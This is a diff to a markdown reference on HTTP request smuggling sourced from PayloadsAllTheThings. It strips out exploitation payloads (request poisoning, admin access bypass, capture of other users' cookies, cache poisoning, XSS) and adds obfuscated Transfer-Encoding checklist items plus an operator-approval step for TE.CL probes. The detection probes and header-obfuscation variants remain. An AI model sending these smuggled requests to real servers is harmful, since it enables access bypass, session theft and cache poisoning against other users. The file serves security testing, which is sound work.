@@ -10,10 +10,6 @@ source_license: MIT; see THIRD_PARTY_NOTICES.md
 
 > Source: PayloadsAllTheThings — Request Smuggling
 
-## Core Concept
-
-Front-end (reverse proxy) and back-end (origin server) disagree on where one request ends and another begins. Exploit the discrepancy between `Content-Length` and `Transfer-Encoding` headers.
-
 ## CL.TE (Front-end uses Content-Length, Back-end uses Transfer-Encoding)
 
 ### Basic Detection
@@ -29,40 +25,6 @@ Transfer-Encoding: chunked
 SMUGGLED
 ```
 
-### Poisoning Next Request
-
-```http
-POST / HTTP/1.1
-Host: target.example
-Content-Length: 6
-Transfer-Encoding: chunked
-
-0
-
-G
-```
-
-The back-end sees the `G` as the start of the next request (`GPOST / HTTP/1.1`), causing a 405 or different response.
-
-### Full Request Smuggling
-
-```http
-POST / HTTP/1.1
-Host: target.example
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 116
-Transfer-Encoding: chunked
-
-0
-
-POST /admin HTTP/1.1
-Host: target.example
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 10
-
-x=1
-```
-
 ## TE.CL (Front-end uses Transfer-Encoding, Back-end uses Content-Length)
 
 ### Basic Detection
@@ -75,25 +37,6 @@ Transfer-Encoding: chunked
 
 8
 SMUGGLED
-0
-
-
-```
-
-### Request Poisoning
-
-```http
-POST / HTTP/1.1
-Host: target.example
-Content-Length: 4
-Transfer-Encoding: chunked
-
-5c
-GPOST / HTTP/1.1
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 15
-
-x=1
 0
 
 
@@ -114,6 +57,9 @@ X: X[\n]Transfer-Encoding: chunked         (header injection)
 Transfer-Encoding\n: chunked               (newline before colon)
 Transfer-Encoding: chunk                   (truncated)
 ```
+
+- [ ] Mixed case: `TrAnSfEr-EnCoDiNg: chunked`
+- [ ] Line folding: `Transfer-Encoding:\n chunked`
 
 ## HTTP/2 Downgrade Smuggling
 
@@ -154,93 +100,11 @@ Host: target.example
 
 ```
 
-## Exploitation Scenarios
-
-### Access Control Bypass
-
-```http
-POST / HTTP/1.1
-Host: target.example
-Content-Length: 70
-Transfer-Encoding: chunked
-
-0
-
-GET /admin HTTP/1.1
-Host: target.example
-X-Forwarded-For: 127.0.0.1
-
-```
-
-### Credential Capture
-
-```http
-POST / HTTP/1.1
-Host: target.example
-Content-Length: 150
-Transfer-Encoding: chunked
-
-0
-
-POST /log HTTP/1.1
-Host: target.example
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 500
-
-data=
-```
-
-The next user's request gets appended to `data=`, sending their headers/cookies to `/log`.
-
-### Cache Poisoning
-
-```http
-POST / HTTP/1.1
-Host: target.example
-Content-Length: 130
-Transfer-Encoding: chunked
-
-0
-
-GET /static/cached-page.js HTTP/1.1
-Host: target.example
-Content-Length: 10
-
-x=1
-```
-
-The smuggled request fetches a cached resource. If the cache stores the response from the poisoned request, subsequent visitors receive the attacker-controlled content.
-
-### XSS via Smuggling
-
-```http
-POST / HTTP/1.1
-Host: target.example
-Content-Length: 150
-Transfer-Encoding: chunked
-
-0
-
-GET /search?q=<script>alert(1)</script> HTTP/1.1
-Host: target.example
-X-Forwarded-For: 127.0.0.1
-
-```
-
 ## Detection Tips
 
 ```
 1. Send CL.TE probe — if response is delayed or different, likely vulnerable
-2. Send TE.CL probe — look for 400/405 errors on the "smuggled" portion
-3. Use Burp Scanner's HTTP Request Smuggling detection
-4. Test with timing: smuggled SLEEP-like behavior
-5. Always test HTTP/2 downgrade if target uses H2
-```
-
-## Tools
-
-```
-- Burp Suite Scanner (built-in smuggling checks)
-- smuggler.py (https://github.com/defparam/smuggler)
-- http-request-smuggling (Burp extension)
+2. Send TE.CL probe (sends a smuggled prefix: operator approval first, per request-smuggling Safety) — look for 400/405 errors on the "smuggled" portion
+3. Test with timing: smuggled SLEEP-like behavior
+4. Always test HTTP/2 downgrade if target uses H2
 ```
